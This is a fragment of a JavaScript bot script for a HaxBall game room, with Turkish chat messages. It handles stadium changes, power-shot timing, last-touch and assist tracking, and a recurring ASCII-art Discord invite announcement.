        if (getRole(byPlayer) < Role.MASTER && currentStadium != 'other') {
            room.sendAnnouncement(
                `Stadyumu manuel olarak değiştiremezsiniz! Lütfen stadyum komutlarını kullanın.`,
                byPlayer.id,
                errorColor,
                'bold',
                HaxNotification.CHAT
            );
            stadiumCommand(emptyPlayer, `!${currentStadium}`);
        } else {
            room.sendAnnouncement(
                `Harita değişti. Bu haritayı tamamladıktan sonra lütfen stadyum komutlarını kullanın.`,
                byPlayer.id,
                infoColor,
                'bold',
                HaxNotification.CHAT
            );
            currentStadium = 'other';
        }
    }
    checkStadiumVariable = true;

    if(newStadiumName == "AF | V7 Power"){
        oynanabilir = true;
    }else {
        oynanabilir = false
    
}
};
var oynanabilir = false;

function CheckPowerShot(){
    if(pointDistance(room.getPlayerDiscProperties(lastPlayerTouched.id),room.getDiscProperties(0)) < triggerDistance){
    TimePlayerBallTouch++;

    if(TimePlayerBallTouch == TimeOut){
    }
    if(TimePlayerBallTouch >= TimeOut){
        if(powerActive == false){
        powerActive = true;
        }
    }
    }
    else{
    if(TimePlayerBallTouch != 0){ //Touch timer is reset when the contact between player and ball is interrupted.
        TimePlayerBallTouch = 0;
    }
    }
}
function getLastTouchTheBall(){
    var ballPosition = room.getBallPosition();
    var players = room.getPlayerList();
    for(var i=0; i<players.length; i++){
        if(players[i].position != null){
            var distanceToBall = pointDistance(players[i].position,ballPosition);
            if(distanceToBall < triggerDistance){
                if(lastPlayerTouched.id != players[i].id){
                    if(lastTeamTouched==players[i].team){
                        assistingTouch = lastPlayerTouched;
                    }
            else{
            assistingTouch = "";
            }
                }
                lastTeamTouched = players[i].team;
                previousPlayerTouched == lastPlayerTouched;
                lastPlayerTouched = players[i];
            }
        }
    }
    return lastPlayerTouched;
}

var previousPlayerTouched;
room.onGameTick = function () {
    if(room.getPlayerList().filter(p => p.team != 0).length > 0 && lastPlayerTouched != ""){ //This is also important to avoid from gametick errors.
    CheckPowerShot();
    }

    getLastTouchTheBall(); //You have to use this in here to get the last toucher.
    checkTime();
    getGameStats();
    handleActivity();
};

var istatistikLink122 = "                                        ▒█▀▀▄ ▀█▀ ▒█▀▀▀█ ▒█▀▀█ ▒█▀▀▀█ ▒█▀▀█ ▒█▀▀▄ ";
var istatistikLink222 = "                                        ▒█░▒█ ▒█░ ░▀▀▀▄▄ ▒█░░░ ▒█░░▒█ ▒█▄▄▀ ▒█░▒█ ";
var istatistikLink322 = "                                        ▒█▄▄▀ ▄█▄ ▒█▄▄▄█ ▒█▄▄█ ▒█▄▄▄█ ▒█░▒█ ▒█▄▄▀ ";
var istatistikLink422 = "                                        https://discord.gg/8nCu3BRRCx                                         ";



function istaLink56777() {
    room.sendAnnouncement(istatistikLink122, null, 0xff6600, "normal", 0);
    room.sendAnnouncement(istatistikLink222, null, 0xff9900, "normal", 0);
    room.sendAnnouncement(istatistikLink322, null, 0xffbb00, "normal", 0);
    room.sendAnnouncement(istatistikLink422, null, 0xffdd00, "normal", 0);
}

var seconds = 180; // Mesajı kaç saniyede bir göndermek istediğinizi burada belirtin
setInterval(istaLink56777, seconds * 1000);